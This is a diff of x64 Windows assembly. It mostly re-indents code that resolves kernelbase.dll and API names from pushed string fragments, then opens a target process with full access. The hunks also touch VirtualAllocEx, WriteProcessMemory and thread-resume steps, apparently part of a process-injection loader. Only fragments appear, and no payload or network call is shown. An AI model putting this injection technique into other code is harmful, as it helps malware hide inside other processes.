@@ -192,41 +192,41 @@ section .deccode
 	call LoadLibrary
 	mov rbx,rcx
 	loadKernelbase:
-			; Load kernelbase.dll
-			mov rax, "se.dll"     
-			push rax
-			mov rax, "kernelba"
-			push rax
-			mov rcx, rsp
-			sub rsp, 0x30
-			call rsi
-			mov r15,rax
-			add rsp, 0x30
-			add rsp, 0x10
+		; Load kernelbase.dll
+		mov rax, "se.dll"     
+		push rax
+		mov rax, "kernelba"
+		push rax
+		mov rcx, rsp
+		sub rsp, 0x30
+		call rsi
+		mov r15,rax
+		add rsp, 0x30
+		add rsp, 0x10
 
 	OpenProcess:
-			;Lookup OpenProcess
-			mov rax, "ess"
-			push rax
-			mov rax, "OpenProc"
-			push rax
-			lea rdx, [rsp]
-			mov rcx, r15
-			sub rsp, 0x30
-			call r14
-			mov r12, rax
-			add rsp, 0x30
-
-			;call OpenProcess
-			xor edx,edx
-			mov r8, [ProcInfo+PROCESSINFO.dwProcessId]
-			mov ecx, 0x1FFFFF
-			sub rsp, 0x30
-			call r12
-			mov rbp, rax
-			add rsp, 0x30
-			mov r13, rax
-			mov [openProcessH], rax
+		;Lookup OpenProcess
+		mov rax, "ess"
+		push rax
+		mov rax, "OpenProc"
+		push rax
+		lea rdx, [rsp]
+		mov rcx, r15
+		sub rsp, 0x30
+		call r14
+		mov r12, rax
+		add rsp, 0x30
+	
+		;call OpenProcess
+		xor edx,edx
+		mov r8, [ProcInfo+PROCESSINFO.dwProcessId]
+		mov ecx, 0x1FFFFF
+		sub rsp, 0x30
+		call r12
+		mov rbp, rax
+		add rsp, 0x30
+		mov r13, rax
+		mov [openProcessH], rax
 		
 	call Locate_kernel32
 	VirtualAllocEx:
@@ -279,7 +279,7 @@ section .deccode
 
 	;delta
 
-WriteProcess:
+	WriteProcess:
 		;Lookup WriteProcessMemory
 		mov rax, "ry"
 		push rax
@@ -305,7 +305,6 @@ WriteProcess:
 		mov rbp, rax
 		add rsp, 0x30     
 	   
-
 	Resume:
 		call Locate_kernel32 
 		mov rax, "read"
@@ -337,8 +336,6 @@ WriteProcess:
 		call r12
 	;END
 	
-			
- 
 section .text
 WinMain:
     Start:
